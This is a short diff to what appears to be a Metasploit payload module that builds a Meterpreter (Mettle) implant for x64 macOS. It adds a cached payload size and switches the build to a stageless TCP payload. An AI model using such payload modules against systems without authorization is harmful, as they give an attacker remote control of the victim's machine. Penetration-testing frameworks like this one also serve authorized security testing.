@@ -10,6 +10,8 @@ require 'msf/base/sessions/meterpreter_x64_osx'
 
 module MetasploitModule
 
+  CachedSize = 618316
+
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
   include Msf::Sessions::MettleConfig
@@ -34,7 +36,10 @@ module MetasploitModule
   end
 
   def generate
-    opts = {scheme: 'tcp'}
+    opts = {
+      scheme: 'tcp',
+      stageless: true
+    }
     MetasploitPayloads::Mettle.new('x86_64-apple-darwin', generate_config(opts)).to_binary :exec
   end
 end
